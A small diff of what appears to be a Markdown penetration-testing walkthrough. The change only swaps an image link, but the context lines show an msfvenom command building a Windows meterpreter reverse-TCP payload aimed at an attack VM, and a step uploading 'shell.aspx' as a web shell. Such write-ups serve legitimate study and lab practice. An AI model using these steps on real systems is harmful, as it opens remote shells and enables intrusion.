@@ -106,7 +106,8 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=[Attack VM] lport=[Attack 
 put shell.aspx<br>
 
 
-![image](https://github.com/user-attachments/assets/d52eb73e-ecd2-45bf-b3fc-028b85538005)
+![image](https://github.com/user-attachments/assets/d06aa0f6-45e5-405e-84e1-a5e6e8669aca)
+
 
 <br>
 msfupdate<br>
